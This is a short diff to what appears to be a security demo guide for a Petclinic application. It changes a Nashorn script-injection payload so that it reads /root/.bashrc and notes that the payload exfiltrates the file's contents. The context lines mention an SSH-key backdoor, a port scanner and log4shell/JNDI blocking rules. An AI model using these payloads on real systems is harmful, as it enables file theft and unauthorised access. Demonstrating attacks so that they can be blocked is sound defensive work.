@@ -69,10 +69,11 @@ The above adds a malicious ssh key to the authorized_keys file. This would allow
 ```
 var Files = Java.type("java.nio.file.Files");
 var Paths = Java.type("java.nio.file.Paths");
-var bytes = Files.readAllBytes(Paths.get("/home/ubuntu/.bashrc"));
+var bytes = Files.readAllBytes(Paths.get("/root/.bashrc"));
 var content = new java.lang.String(bytes);
 content;
 ```
+The above will exfiltrate the contents of the .bashrc file.
 
 Port Scanner
 ```
@@ -176,6 +177,7 @@ When you send the payload to the Petclinic application via the Owner firstname/l
 
 ## How to Block
 * This can be blocked by Protect by setting to BLOCK in the Email Service the log4shell or JNDI rules.
+
 
 
 
